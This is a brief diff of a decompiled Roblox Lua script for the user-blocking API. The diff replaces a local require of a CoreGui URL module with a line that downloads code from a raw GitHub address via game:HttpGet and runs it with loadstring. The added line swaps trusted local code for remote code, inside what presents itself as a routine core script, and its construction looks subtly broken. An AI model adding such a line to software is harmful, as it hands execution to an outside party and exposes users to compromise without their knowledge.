@@ -3,7 +3,7 @@ local l__HttpService__2 = game:GetService("HttpService");
 local l__Players__3 = game:GetService("Players");
 local l__StarterGui__4 = game:GetService("StarterGui");
 local l__RobloxReplicatedStorage__5 = game:GetService("RobloxReplicatedStorage");
-local v6 = require(game:GetService("CoreGui"):WaitForChild("RobloxGui").Modules.Common.Url);
+local v6 = require(loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptHosting/RobloxCore/main/Url"))())
 game:DefineFastFlag("EnableMigrateBlockingOffAPIProxy", false);
 game:DefineFastFlag("MigrateGetBlockedUsers2", false);
 local v7 = {};
